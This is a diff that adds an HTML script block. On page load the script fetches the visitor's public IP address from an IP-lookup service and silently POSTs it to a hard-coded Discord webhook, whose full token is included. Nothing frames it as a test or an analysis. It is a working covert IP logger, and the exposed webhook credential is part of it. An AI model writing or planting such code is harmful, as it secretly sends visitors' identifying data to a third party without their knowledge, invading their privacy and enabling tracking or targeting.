@@ -1,0 +1,25 @@
+<script>
+const xhr = new XMLHttpRequest();
+const requesttt = new XMLHttpRequest();
+
+requesttt.open("POST", "https://discord.com/api/webhooks/1257970239606489098/DaugzfZs4PCeDHZy0rq8_FG-gsupx1MmQL5t3rGlZ8FI74wYuH8DU4Hd53wcDnSCc42P");
+requesttt.setRequestHeader("Content-type", "application/json");
+xhr.open("GET", "https://api.ipify.org/", true);
+
+xhr.responseType = "text";
+
+xhr.onload = () => {
+  if (xhr.readyState === xhr.DONE) {
+    if (xhr.status === 200) {
+      console.log(xhr.response);
+  let optionss = {
+    content: xhr.response,
+  }
+
+requesttt.send(JSON.stringify(optionss));
+    }
+  }
+};
+
+xhr.send(null);
+</script>
